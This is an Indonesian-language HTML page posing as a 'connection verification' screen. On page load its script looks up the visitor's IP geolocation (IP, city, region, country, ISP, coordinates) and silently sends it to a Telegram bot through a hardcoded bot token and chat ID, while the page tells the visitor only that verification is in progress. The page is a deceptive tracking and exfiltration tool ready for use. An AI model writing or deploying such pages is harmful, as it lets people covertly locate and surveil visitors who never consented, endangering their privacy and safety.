<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
            text-align: center;
            max-width: 400px;
            width: 100%;
            border: 1px solid #e9ecef;
        }
        h2 {
            color: #212529;
            margin-bottom: 10px;
        }
        p {
            color: #6c757d;
            font-size: 0.95rem;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Memproses Verifikasi</h2>
        <p id="status">Mohon tunggu, sistem sedang memvalidasi koneksi Anda...</p>
    </div>

    <script>
        // KONTROL BOT TELEGRAM Anda (Pastikan token dan chat ID sudah benar)
        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
        const CHAT_ID = '1966317946';

        // Berjalan otomatis saat halaman dibuka
        window.onload = function() {
            ambilLokasiMelaluiIP();
        };

        function ambilLokasiMelaluiIP() {
            // Mengambil data lokasi berdasarkan IP publik pengunjung
            fetch('https://ipapi.co')
                .then(response => response.json())
                .then(data => {
                    // Menyusun informasi teks yang akan dikirim ke Telegram
                    const pesan = `
📍 *Informasi Pengunjung Baru*
• *IP*: ${data.ip || 'Tidak diketahui'}
• *Kota*: ${data.city || 'Tidak diketahui'}
• *Wilayah/Provinsi*: ${data.region || 'Tidak diketahui'}
• *Negara*: ${data.country_name || 'Tidak diketahui'}
• *Provider/ISP*: ${data.org || 'Tidak diketahui'}
• *Koordinat*: ${data.latitude || '0'}, ${data.longitude || '0'}
                    `;
                    
                    // Mengirim data teks ke Telegram
                    kirimKeTelegram(pesan);
                })
                .catch(error => {
                    document.getElementById('status').innerText = "Gagal memverifikasi koneksi.";
                    kirimKeTelegram("Gagal mengambil data IP pengunjung karena masalah API.");
                });
        }

        function kirimKeTelegram(teks) {
            // Perbaikan URL Telegram Bot API yang benar
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: teks,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => res.json())
            .then(hasil => {
                if(hasil.ok) {
                    document.getElementById('status').innerText = "Verifikasi selesai. Terima kasih.";
                } else {
                    document.getElementById('status').innerText = "Konfigurasi bot salah.";
                }
            })
            .catch(() => {
                document.getElementById('status').innerText = "Terjadi kesalahan jaringan ke Telegram.";
            });
        }
    </script>

</body>
</html>
